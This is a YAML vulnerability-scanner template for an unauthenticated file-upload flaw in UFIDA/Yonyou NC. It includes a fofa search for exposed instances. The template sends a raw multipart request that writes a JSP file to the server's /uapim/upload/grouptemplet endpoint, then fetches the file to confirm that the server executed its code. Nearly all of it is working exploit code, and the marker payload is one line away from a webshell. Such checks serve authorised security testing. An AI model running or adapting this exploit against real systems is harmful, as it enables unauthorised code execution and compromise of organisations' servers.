id: yonyou-nc-grouptemplet-fileupload

info:
  name: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload
  author: SleepingBag945
  severity: critical
  verified: true
  description: |
    The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.
    fofa: app="用友-UFIDA-NC
  reference:
    - https://www.seebug.org/vuldb/ssvid-99547
    - https://github.com/Augensternyu/POC-bomber/blob/main/pocs/redteam/yongyou_nc_fileupload_2022.py
  tags: yonyou,intrusive,ufida,fileupload,vuln
  created: 2025/11/18

set:
  v1: randomInt(1,100)
  randstr_1: randomLowercase(28)
  randstr_2: randomLowercase(28)
  hostname: request.url.host
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      raw: |
        POST /uapim/upload/grouptemplet?groupid={{v1}}&fileType=jsp HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}

        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
        Content-Type: application/octet-stream

        <%out.println("{{randstr_2}}");%>
        ------WebKitFormBoundary{{rboundary}}--
    expression: true
  r1:
    request:
      raw: |
        GET /uapim/static/pages/{{v1}}/head.jsp HTTP/1.1
        User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Host: {{hostname}}
    expression: response.status == 200 && response.body.bcontains(bytes(randstr_2))
expression: r0() && r1()
